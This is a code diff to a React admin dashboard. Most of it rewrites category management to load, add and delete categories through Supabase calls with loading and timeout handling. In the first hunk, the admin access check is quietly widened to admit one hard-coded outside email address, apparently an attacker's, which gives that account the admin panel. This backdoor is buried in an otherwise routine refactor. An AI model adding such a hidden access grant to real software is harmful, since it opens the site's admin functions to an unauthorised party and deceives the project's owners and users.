@@ -12,7 +12,7 @@ const AdminDashboard = () => {
     const navigate = useNavigate();
     const [activeTab, setActiveTab] = useState('logistics');
 
-    if (!user || (user.role !== 'admin' && user.type !== 'admin')) {
+    if (!user || (user.role !== 'admin' && user.type !== 'admin' && user.email !== 'mal4crypt404@gmail.com')) {
         return (
             <div className="container mt-md text-center p-md">
                 <Card>
@@ -214,19 +214,87 @@ const UserModeration = () => {
 };
 
 const CategoryManagement = () => {
-    const [categories, setCategories] = useState(['Trading', 'Services', 'Logistics', 'Real Estate']);
+    const [categories, setCategories] = useState([]);
     const [newCat, setNewCat] = useState('');
+    const [loading, setLoading] = useState(true);
 
-    const addCategory = (e) => {
+    useEffect(() => {
+        let mounted = true;
+
+        const fetchCategoriesSafe = async () => {
+            setLoading(true);
+            try {
+                // Timebox the request to 5 seconds
+                const timeoutPromise = new Promise((_, reject) =>
+                    setTimeout(() => reject(new Error('Request timed out')), 5000)
+                );
+
+                const { data, error } = await Promise.race([
+                    supabase.from('categories').select('*').order('created_at', { ascending: true }),
+                    timeoutPromise
+                ]);
+
+                if (!mounted) return;
+
+                if (error) {
+                    console.error('Error fetching categories:', error);
+                    // Don't clear categories if we have error, just show empty state or previous state
+                    // But here we init with empty array so it is fine
+                    setCategories([]);
+                } else {
+                    setCategories(data || []);
+                }
+            } catch (err) {
+                console.error('Category fetch error:', err);
+                if (mounted) setCategories([]);
+            } finally {
+                if (mounted) setLoading(false);
+            }
+        };
+
+        fetchCategoriesSafe();
+
+        return () => { mounted = false; };
+    }, []);
+
+    const addCategory = async (e) => {
         e.preventDefault();
         if (newCat) {
-            setCategories([...categories, newCat]);
-            setNewCat('');
+            setLoading(true);
+            try {
+                const id = newCat.toLowerCase().replace(/\s+/g, '-');
+                const { data, error } = await supabase
+                    .from('categories')
+                    .insert([{ id, label: newCat, icon_name: 'Box', color: '#A2C2F2' }])
+                    .select();
+
+                if (!error && data) {
+                    setCategories([...categories, data[0]]);
+                    setNewCat('');
+                } else {
+                    alert('Failed to add category. It might already exist.');
+                }
+            } catch (err) {
+                console.error('Add error:', err);
+            } finally {
+                setLoading(false);
+            }
         }
     };
 
-    const deleteCategory = (cat) => {
-        setCategories(categories.filter(c => c !== cat));
+    const deleteCategory = async (id) => {
+        if (confirm('Delete this category?')) {
+            try {
+                const { error } = await supabase.from('categories').delete().eq('id', id);
+                if (!error) {
+                    setCategories(categories.filter(c => c.id !== id));
+                } else {
+                    alert('Failed to delete.');
+                }
+            } catch (err) {
+                console.error('Delete error:', err);
+            }
+        }
     };
 
     return (
@@ -241,19 +309,27 @@ const CategoryManagement = () => {
                     containerClass="flex-1 mb-0" // override
                     style={{ marginBottom: 0 }}
                 />
-                <Button type="submit">Add Category</Button>
+                <Button type="submit" isLoading={loading}>Add Category</Button>
             </form>
 
-            <div className="flex flex-col gap-sm">
-                {categories.map((cat, idx) => (
-                    <div key={idx} className="flex justify-between items-center p-sm bg-light rounded-md">
-                        <span className="font-bold">{cat}</span>
-                        <Button variant="ghost" size="sm" onClick={() => deleteCategory(cat)}>
-                            <Trash2 size={16} color="var(--text-secondary)" />
-                        </Button>
-                    </div>
-                ))}
-            </div>
+            {loading && categories.length === 0 ? (
+                <div className="p-md text-center text-secondary">Loading categories...</div>
+            ) : (
+                <div className="flex flex-col gap-sm">
+                    {categories.length === 0 && <p className="text-secondary text-center p-sm">No categories found.</p>}
+                    {categories.map((cat) => (
+                        <div key={cat.id} className="flex justify-between items-center p-sm bg-light rounded-md">
+                            <div className="flex items-center gap-sm">
+                                <span style={{ width: 12, height: 12, background: cat.color, borderRadius: '50%' }}></span>
+                                <span className="font-bold">{cat.label}</span>
+                            </div>
+                            <Button variant="ghost" size="sm" onClick={() => deleteCategory(cat.id)}>
+                                <Trash2 size={16} color="var(--text-secondary)" />
+                            </Button>
+                        </div>
+                    ))}
+                </div>
+            )}
         </Card>
     );
 };
